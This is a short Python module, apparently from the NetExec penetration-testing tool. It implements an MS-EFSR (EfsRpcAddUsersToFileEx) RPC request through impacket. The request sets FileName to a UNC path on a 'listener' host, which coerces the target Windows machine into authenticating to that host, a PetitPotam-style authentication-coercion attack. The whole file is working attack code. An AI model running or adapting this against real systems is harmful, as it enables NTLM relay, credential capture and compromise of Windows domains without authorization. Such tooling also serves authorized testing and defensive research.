from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD, NDRPOINTERNULL

from nxc.modules.coerce_plus_method.MS_EFSR.dtypes import ENCRYPTION_CERTIFICATE_LIST
from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ("dwFlags", DWORD),    # Type: DWORD
        # Accroding to this page: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
        # Reserved must be set to NULL
        ("Reserved", NDRPOINTERNULL),   # Type: NDRPOINTERNULL *
        ("FileName", WSTR),    # Type: wchar_t *
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),  # Type: ENCRYPTION_CERTIFICATE_LIST *
    )


class EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = ()


def request(dce, target, listener):
    request = EfsRpcAddUsersToFileEx()
    request["dwFlags"] = 0x00000002
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    dce.request(request)